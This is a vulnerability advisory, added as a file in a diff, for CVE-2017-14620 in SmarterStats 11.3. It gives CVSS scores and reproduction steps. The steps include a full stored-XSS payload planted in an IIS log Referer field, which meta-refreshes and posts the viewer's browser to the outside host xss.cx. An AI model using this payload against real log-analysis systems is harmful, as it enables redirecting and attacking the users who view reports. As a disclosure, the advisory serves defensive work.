@@ -1,0 +1,68 @@
+﻿----------------------------
+Title: CVE-2017-14620
+----------------------------
+TL;DR: SmarterStats Version 11.3.6347, and possibly prior versions, 
+will Render the Referer Field of HTTP Logfiles in URL /Data/Reports/ReferringURLsWithQueries
+----------------------------
+Author: David Hoyt
+Date: September 29, 2017
+----------------------------
+CVSS:3.0 Metrics
+CVSS:3.0 Vector String: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C/CR:M/MAV:N/MAC:L/MPR:N/MUI:R/MS:U/MC:L/MI:N/MA:N
+CVSS:3.0 Scores: Base Score 4.3, Temporal Score: 4.1, Environmental Score: 4.1
+----------------------------
+Keywords
+----------------------------
+CVE-2017-14620, CWE-533, CWE-532, CWE-117, CWE-93, CAPEC-86, CAPEC-79, Stored Document Object Model Cross Site Scripting (Stored DOM XSS), 
+Client Side Request Forgery (CSRF), Open Redirection, HTTP Logfiles, Exploit, PoC, HTML Tags, SmarterStats 11.3
+----------------------------
+CVE-2017-14620 Requirements
+----------------------------
+	SmarterStats Version 11.3
+	HTTP Proxy (BurpSuite, Fiddler)
+	Web Browser (Chrome - Current/Stable)
+	User Interaction Required - Must Click Referer Link Report
+	Supported Windows OS
+	Microsoft .NET 4.5
+----------------------------
+CVE-2017-14620 Reproduction
+----------------------------
+Vendor Link https://www.smartertools.com/smarterstats/website-analytics
+Download Link https://www.smartertools.com/smarterstats/downloads
+
+Step 1: Test with an HTTP Logfile containing a URL-encoded String to the Referer Field with HTML Tags to be Rendered in a Browser:
+
+http://www.bing.com/search?q=<html><head><meta http-equiv=\"refresh\" content=\"5; 
+url=http://xss.cx/\"><title>Loading</title></head>\n<body><form method=\"post\" 
+action=\"http://xss.cx/\" target=\"_top\" id=\"rf\"><input type=\"hidden\" 
+name=\"ic\" value=\"0\"><input type=\"hidden\" name=\"fb\" value=\"true\"/>
+</form>\n<script>!function(e,t){var n,i;return!e.navigator&form=nnn
+
+Step 2: Verify the Injected IIS Logfile
+Step 3: Process the Logfiles, Select the Referer URL Report. 
+In an HTTP Proxy, watch the URL  http://localhost:9999/Data/Reports/ReferringURLsWithQueries 
+when Browsing http://localhost:9999/Default.aspx in Chrome (current/stable).
+
+Step 4: Verify the Result in your HTTP Proxy returned from the Server:
+
+{"c":[{"v":"http://www.bing.com/search?q=<html><head><meta http-equiv=\"refresh\" 
+content=\"5; url=http://xss.cx/\"><title>Loading</title></head>\n<body>
+<form method=\"post\" action=\"http://xss.cx/\" target=\"_top\" id=\"rf\">
+<input type=\"hidden\" name=\"ic\" value=\"0\"><input type=\"hidden\" name=\"fb\" value=\"true\"/>
+</form>\n<script>!function(e,t){var n,i;return!e.navigator&form=nnn"},{"v":"2","f":"2"}]}
+
+In your Browser, the HTTP Response will cause a GET to xss.cx after 5 seconds. Verify in HTTP Proxy.
+...
+GET / HTTP/1.1
+Host: xss.cx
+...
+
+Step 5: Watch your Browser get Redirected to XSS.Cx.
+----------------------------
+Summary: The Referer Field in IIS Logfiles, and possibly other Field Names, are Rendered by SmarterStats Version 11.3.6347.
+----------------------------
+Timeline
+----------------------------
+Reported to SmarterTools on September 19, 2017
+Obtain CVE-2017-14620 from MITRE on September 20, 2017
+Resolved September 28, 2017 with Version 11.xxxx
